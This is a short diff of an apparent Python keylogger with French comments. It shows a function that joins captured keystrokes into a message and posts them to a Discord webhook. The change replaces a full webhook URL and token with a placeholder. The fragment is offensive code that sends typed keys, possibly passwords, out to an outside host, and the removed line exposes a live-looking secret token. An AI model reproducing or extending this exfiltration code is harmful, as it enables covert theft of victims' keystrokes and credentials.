@@ -12,7 +12,7 @@ def jsp(key):
 #modifier l'url du webhooks du discord
 
 def envoyer():
-    url = 'https://discord.com/api/webhooks/1313189869115146362/rMgHilGBElyfkREieC_JttqZDPElfi8FxzHuY9PSC3c58Mk-HdwTgJJXPRxEVGx5FEAy'
+    url = 'https://discord.com/api/webhooks/................'
     keylog = {
         "content": " TOUCHE ENVOYE :       ".join(touche)  
     }
